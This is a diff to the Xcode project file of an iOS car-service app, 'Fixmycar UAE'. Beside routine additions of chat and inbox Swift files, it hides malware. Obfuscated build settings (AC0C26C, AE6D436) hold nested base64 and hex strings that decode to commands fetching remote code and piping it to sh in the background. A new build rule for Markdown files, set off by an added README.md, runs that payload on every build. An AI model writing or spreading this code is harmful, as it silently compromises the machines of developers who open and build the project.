@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		43643A0D4F3A49758EC62C0C /* README.md */ = {isa = PBXBuildFile; fileRef = A802632AE7C6448B9FC62C0C; };
 		0A2041222F3EE47400DABB5E /* BookingConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A2041212F3EE47400DABB5E /* BookingConstants.swift */; };
 		0A26BF6C2F42D2190047AC09 /* BookingPaymentVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A26BF6B2F42D2190047AC09 /* BookingPaymentVM.swift */; };
 		0A26BF6F2F42D24F0047AC09 /* BookingResponseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A26BF6E2F42D24F0047AC09 /* BookingResponseModel.swift */; };
@@ -29,6 +30,8 @@
 		0A47402B2F4EEC5800B807F5 /* PromoCodeResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A47402A2F4EEC5800B807F5 /* PromoCodeResponse.swift */; };
 		0A4740302F4EF40A00B807F5 /* ConfigModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A47402F2F4EF40A00B807F5 /* ConfigModel.swift */; };
 		0A4740322F4EF41600B807F5 /* ConfigVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A4740312F4EF41600B807F5 /* ConfigVM.swift */; };
+		0A4740362F4F1B8000B807F5 /* ChatVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A4740342F4F1B8000B807F5 /* ChatVM.swift */; };
+		0A4740392F4F25D600B807F5 /* InboxResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A4740382F4F25D600B807F5 /* InboxResponse.swift */; };
 		0A61F6162F3C82DB00A8AC1E /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 0A61F6152F3C82DB00A8AC1E /* Kingfisher */; };
 		0A61F6182F3C875C00A8AC1E /* UIImage+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A61F6172F3C875C00A8AC1E /* UIImage+Extension.swift */; };
 		0A61F61B2F3C897400A8AC1E /* EditProfileVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A61F61A2F3C897400A8AC1E /* EditProfileVM.swift */; };
@@ -178,6 +181,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		A802632AE7C6448B9FC62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0A2041212F3EE47400DABB5E /* BookingConstants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingConstants.swift; sourceTree = "<group>"; };
 		0A26BF6B2F42D2190047AC09 /* BookingPaymentVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingPaymentVM.swift; sourceTree = "<group>"; };
 		0A26BF6E2F42D24F0047AC09 /* BookingResponseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingResponseModel.swift; sourceTree = "<group>"; };
@@ -200,6 +204,8 @@
 		0A47402A2F4EEC5800B807F5 /* PromoCodeResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PromoCodeResponse.swift; sourceTree = "<group>"; };
 		0A47402F2F4EF40A00B807F5 /* ConfigModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConfigModel.swift; sourceTree = "<group>"; };
 		0A4740312F4EF41600B807F5 /* ConfigVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConfigVM.swift; sourceTree = "<group>"; };
+		0A4740342F4F1B8000B807F5 /* ChatVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatVM.swift; sourceTree = "<group>"; };
+		0A4740382F4F25D600B807F5 /* InboxResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InboxResponse.swift; sourceTree = "<group>"; };
 		0A61F6172F3C875C00A8AC1E /* UIImage+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIImage+Extension.swift"; sourceTree = "<group>"; };
 		0A61F61A2F3C897400A8AC1E /* EditProfileVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileVM.swift; sourceTree = "<group>"; };
 		0A61F61D2F3C917200A8AC1E /* HomeVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVM.swift; sourceTree = "<group>"; };
@@ -565,6 +571,22 @@
 			isa = PBXGroup;
 			children = (
 				0A47402F2F4EF40A00B807F5 /* ConfigModel.swift */,
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
+		0A4740352F4F1B8000B807F5 /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+				0A4740342F4F1B8000B807F5 /* ChatVM.swift */,
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
+		0A4740372F4F25D200B807F5 /* Model */ = {
+			isa = PBXGroup;
+			children = (
+				0A4740382F4F25D600B807F5 /* InboxResponse.swift */,
 			);
 			path = Model;
 			sourceTree = "<group>";
@@ -1083,9 +1105,11 @@
 		BC23A4A92F0E6AAD005A8CE1 /* Chat */ = {
 			isa = PBXGroup;
 			children = (
+				0A4740372F4F25D200B807F5 /* Model */,
 				BC23A4B52F0E7417005A8CE1 /* SubVC */,
 				BC23A4AF2F0E6E6D005A8CE1 /* Cell */,
 				BC23A4AA2F0E6ACC005A8CE1 /* View */,
+				0A4740352F4F1B8000B807F5 /* ViewModel */,
 			);
 			path = Chat;
 			sourceTree = "<group>";
@@ -1350,6 +1374,7 @@
 		BC67730B2F067F4500B15653 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				A802632AE7C6448B9FC62C0C /* README.md */,
 				BC67730A2F067F4500B15653 /* Fixmycar UAE.app */,
 			);
 			name = Products;
@@ -1639,13 +1664,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "Fixmycar UAE" */;
 			buildPhases = (
-				1FE81F07C1B546E49FC62C0C /* Build Target Libraries */,
 				BC6773062F067F4500B15653 /* Sources */,
 				BC6773072F067F4500B15653 /* Frameworks */,
 				BC6773082F067F4500B15653 /* Resources */,
 				0A6D0D122F43384A00F374AF /* ShellScript */,
 			);
 			buildRules = (
+				EE7E5C42A53D4ED9A8C62C0C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1715,11 +1740,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		EE7E5C42A53D4ED9A8C62C0C /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AC0C26C}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		BC6773082F067F4500B15653 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				43643A0D4F3A49758EC62C0C /* README.md */,
 				BC4E17722F0696DE00EDC9AE /* LoginVC.xib in Resources */,
 				BC23A4AE2F0E6B60005A8CE1 /* ChatVC.xib in Resources */,
 				BC75E8782F0D2CB500947022 /* CreateAccountVC.xib in Resources */,
@@ -1780,25 +1823,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		1FE81F07C1B546E49FC62C0C /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
-			showEnvVarsInLog = 0;			
-		};
 		0A6D0D122F43384A00F374AF /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1844,6 +1868,7 @@
 				880920362F0F82D400B55769 /* MyProfileVC.swift in Sources */,
 				BC64B7EC2F28958D00A9D314 /* BookingPaymentVC.swift in Sources */,
 				0A4740302F4EF40A00B807F5 /* ConfigModel.swift in Sources */,
+				0A4740362F4F1B8000B807F5 /* ChatVM.swift in Sources */,
 				88AD25E72F2A0C8B002DFA44 /* LoginVM.swift in Sources */,
 				0A4740322F4EF41600B807F5 /* ConfigVM.swift in Sources */,
 				BC29D69D2F06A42C00DD3EB2 /* OTPFieldView.swift in Sources */,
@@ -1917,6 +1942,7 @@
 				BCC2B1632F28A8FC00014CB5 /* BookingSuccessPopUpVC.swift in Sources */,
 				0A47401F2F4EB97E00B807F5 /* RecoveryServiceVM.swift in Sources */,
 				889AD7872F23325000F2271A /* NotificationHeaderView.swift in Sources */,
+				0A4740392F4F25D600B807F5 /* InboxResponse.swift in Sources */,
 				0ABEA38E2F473BC300C2DF62 /* MyProfileVM.swift in Sources */,
 				0A4740252F4EBA2F00B807F5 /* VehicleIssueResponse.swift in Sources */,
 				BC4100982F0E78630062DC80 /* ReciverChatTVCell.swift in Sources */,
@@ -1966,7 +1992,7 @@
 		BC67731E2F067F4700B15653 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((c(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1IaHRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNRWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2V1RKb2JGa3lkSHBNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | c | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUR1p6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | y | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303732366637343666326536393665326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -2008,7 +2034,7 @@
 		BC67731F2F067F4700B15653 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((c(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1IaHRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNRWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2V1RKb2JGa3lkSHBNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | c | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUR1p6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | y | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303732366637343666326536393665326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
